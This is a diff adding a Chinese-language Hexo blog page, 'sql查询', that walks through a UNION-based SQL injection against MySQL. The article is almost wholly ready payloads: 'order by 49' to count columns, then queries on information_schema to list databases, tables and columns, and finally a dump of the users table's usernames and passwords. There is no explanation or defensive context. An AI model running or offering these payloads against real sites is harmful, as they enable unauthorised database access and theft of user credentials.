@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+	<meta name="description" content>
+	<meta name="keywords" content>
+	
+	<title>sql查询 - Hexo</title>
+  <link rel="alternate" href type="application/atom+xml">
+	<link rel="shortcut icon" href>
+	<link rel="stylesheet" href="/css/style.css">
+	<script>
+		(function(d) {
+		  var config = {
+			kitId: 'huq1ytd',
+			scriptTimeout: 3000,
+			async: true
+		  },
+		  h=d.documentElement,t=setTimeout(function(){h.className=h.className.replace(/\bwf-loading\b/g,"")+" wf-inactive";},config.scriptTimeout),tk=d.createElement("script"),f=false,s=d.getElementsByTagName("script")[0],a;h.className+=" wf-loading";tk.src='https://use.typekit.net/'+config.kitId+'.js';tk.async=true;tk.onload=tk.onreadystatechange=function(){a=this.readyState;if(f||a&&a!="complete"&&a!="loaded")return;f=true;clearTimeout(t);try{Typekit.load(config)}catch(e){}};s.parentNode.insertBefore(tk,s)
+		})(document);
+	</script>
+</head>
+<body>
+	<div class="body-box">
+		<div class="content-box">
+			<div class="sidebar">
+	<div class="widget-me">
+		<div class="me-avatar">
+			<a href="/"><img src="/imgs/avatar.jpg"/></a>
+		</div>
+		<h2 class="me-name">
+			<a href="/">桂花</a>
+		</h2>
+	</div>
+	<div class="widget-nav">
+		<nav class="nav-list">
+			<ul>
+				
+					<li>
+						<a href="/" class="">
+							<span>主页</span>
+						</a>
+					</li>
+				
+					<li>
+						<a href="/archives/" class="">
+							<span>归档</span>
+						</a>
+					</li>
+				
+			</ul>
+		</nav>
+	</div>
+	<div class="sidebar-wrap">
+		<div class="widget-tags">
+			<h2 class="widget-title">标签</h2>
+			
+		</div>
+	</div>
+</div>
+			<div class="content-article">
+				<i class="mobile-toggle" style="display:none;"><img src="/imgs/menu.png"/></i>
+				<div class="content-article-box">
+					<article class="article  article-post">
+    <h2 class="article-title cl">
+        <a href="/2019/08/14/sql (2)/" title="sql查询" class="title-main">sql查询</a>
+        <small class="article-time">2019-08-14</small>
+    </h2>
+    <div class="article-con">
+        
+        <h2 id="判断有多少个字段"><a href="#判断有多少个字段" class="headerlink" title="判断有多少个字段"></a>判断有多少个字段</h2><p>order by49</p>
+<h2 id="查询mysql版本"><a href="#查询mysql版本" class="headerlink" title="查询mysql版本"></a>查询mysql版本</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select version(),database(),user(),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49 <span class="built_in">limit</span> 1,1;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/sql1.jpg" alt></p>
+<h2 id="查询有多少库"><a href="#查询有多少库" class="headerlink" title="查询有多少库"></a>查询有多少库</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select (select group_concat(schema_name) from information_schema.schemata),2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49 <span class="built_in">limit</span> 1,1;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/sql2.jpg" alt></p>
+<h2 id="查询test数据库"><a href="#查询test数据库" class="headerlink" title="查询test数据库"></a>查询test数据库</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select (select group_concat(table_name) from information_schema.tables WHERE table_schema = <span class="string">'test'</span>),2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49 <span class="built_in">limit</span> 1,1;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/sql3.jpg" alt></p>
+<h2 id="查询test库content表"><a href="#查询test库content表" class="headerlink" title="查询test库content表"></a>查询test库content表</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select (select group_concat(column_name) from information_schema.columns WHERE table_name = <span class="string">'content'</span>),2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49 <span class="built_in">limit</span> 1,1;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/sql4.jpg" alt></p>
+<h2 id="查询test库users表"><a href="#查询test库users表" class="headerlink" title="查询test库users表"></a>查询test库users表</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select (select group_concat(column_name) from information_schema.columns WHERE table_name = <span class="string">'users'</span>),2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49 <span class="built_in">limit</span> 1,1;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/sql5.jpg" alt></p>
+<h2 id="查询test库content表里面的数据"><a href="#查询test库content表里面的数据" class="headerlink" title="查询test库content表里面的数据"></a>查询test库content表里面的数据</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select (select group_concat(id,<span class="string">'`'</span>,title,<span class="string">'`'</span>,author,<span class="string">'`'</span>,value,<span class="string">'`'</span>,time,<span class="string">'`'</span>,ip) from test.content),2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49 <span class="built_in">limit</span> 1,1;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/sql6.jpg" alt></p>
+<h2 id="查询test库users表里面的数据"><a href="#查询test库users表里面的数据" class="headerlink" title="查询test库users表里面的数据"></a>查询test库users表里面的数据</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select (select group_concat(id,<span class="string">'`'</span>,username,<span class="string">'`'</span>,passwd,<span class="string">'`'</span>,user_ip,<span class="string">'`'</span>,join_date) from test.users),2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49 <span class="built_in">limit</span> 1,1;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/sql7.jpg" alt></p>
+
+    </div>
+    
+    <div class="article-navgition">
+        <div class="navgition-wrap">
+            
+                <div class="navgition-prev">
+                    <h2 class="navgition-title">上一篇: <a href="javascript:void(0);">暂无</a></h2>
+                </div>
+            
+
+            
+                <div class="navgition-next">
+                    <h2 class="navgition-title">下一篇: <a href="/2019/08/12/sql/">mysql通过information_schema查询数据 </a></h2>
+                </div>
+            
+        </div>
+    </div>
+    
+</article>
+					
+				</div>
+				<footer class="footer">
+	<p class="footer-intro">
+		
+		@2019 Hexo.
+		<br/>
+		站点描述
+	</p>
+	<a href="https://github.com/shijuuu/hexo-theme-mokusei" target="_blank" class="extra">MOKUSEI</a>
+</footer>
+
+
+
+
+
+
+			</div>
+		</div>
+	</div>
+	<script src="/js/org/jquery.min.js"></script>
+	<script src="/js/feature.js"></script>
+	<script>
+		var Feature = new Feature();
+		Feature.init();
+	</script>
+</body>
+</html>
